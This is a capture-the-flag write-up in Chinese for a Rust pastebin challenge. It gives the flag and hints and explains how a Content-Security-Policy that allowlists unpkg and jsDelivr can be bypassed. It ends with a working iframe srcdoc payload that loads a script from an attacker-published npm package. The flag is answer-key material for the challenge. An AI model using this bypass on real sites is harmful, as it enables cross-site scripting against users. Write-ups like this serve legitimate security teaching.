# paste_bin

## Description

```
一个由 Rust 构建的、内存安全的、零成本抽象的、RAII 的、无 GC 的、无运行时的、函数式的、并发的、异步的、高性能的、可靠的、具有生产力的 Pastebin

R 门 🙏

**注意: 在与远程环境 (bot) 交互之前, 请确保你的 payload 能在本地环境打通**
```

Flag: `0xGame{easy_csp_bypass_in_rust-e928e182b4fd}`

Hints

```
1, 关注前端的 HTML, JS 和后端的 src/bot.rs 即可, 其它代码不重要
2. Content-Security-Policy 是什么?
3. 尝试将 payload 塞到 iframe 标签的 srcdoc 属性里面
4. jsdelivr 和 unpkg 是什么东西?
```

## Writeup

考点: CSP 绕过

[https://aszx87410.github.io/beyond-xss/ch2/xss-defense-csp/](https://aszx87410.github.io/beyond-xss/ch2/xss-defense-csp/)

[https://aszx87410.github.io/beyond-xss/ch1/javascript-protocol/](https://aszx87410.github.io/beyond-xss/ch1/javascript-protocol/)

/view 页面的 CSP 如下

```
base-uri 'none'; style-src 'unsafe-inline'; script-src 'self' 'sha256-mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=' cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net;
```

可以看到 script-src 除了 self 和 sha256 hash 以外, 还有 cdn.tailwindcss.com, unpkg.com 和 cdn.jsdelivr.net

self 表示仅允许加载同源网站 (当前网站) 下的 js 文件, 例如 /static/ 目录里的 index.js, view.js, report.js

sha256 hash 表示允许加载某个 js, 该 js 的 sha256 base64 为 `mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=` (为了加载 tailwind css 的 js 脚本, 对于解题来说不重要)

剩余的 cdn.tailwindcss.com, unpkg.com 和 cdn.jsdelivr.net 表示允许加载这三个网站下的 js 文件

这道题的思路是后面两个: jsdelivr 和 unpkg, 这两个东西都是 CDN 服务, 即开发者发布的 npm 包都可以通过这两个 CDN 加载

我们只需要在 [https://www.npmjs.com/](https://www.npmjs.com/) 注册账号, 然后上传一个 npm 包, 包内包含恶意的 js 文件, 最后通过 jsdelivr 或 unpkg 加载即可

payload

```html
<iframe srcdoc="<script src='https://unpkg.com/my-package-x1r0z@1.1.0/exp.js'></script>"></iframe>
```